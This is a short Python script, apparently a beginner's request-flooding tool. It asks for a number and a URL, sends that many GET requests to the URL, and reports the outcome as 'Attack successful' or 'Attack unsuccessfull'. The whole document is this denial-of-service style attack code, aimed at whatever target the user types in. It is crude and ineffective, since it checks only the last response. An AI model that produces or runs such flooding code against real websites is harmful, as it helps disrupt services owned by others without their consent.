import requests
input1 = int(input('how many times?'))
input2 = str(input('whats your url?'))
for a in range(input1):
   spam = requests.get(input2)
result = spam.status_code
message = result == 200
if message == False:
   print(f'Attack unsuccessfull error code {result}')
if message == True:
   print(f'Attack successful code {result}')
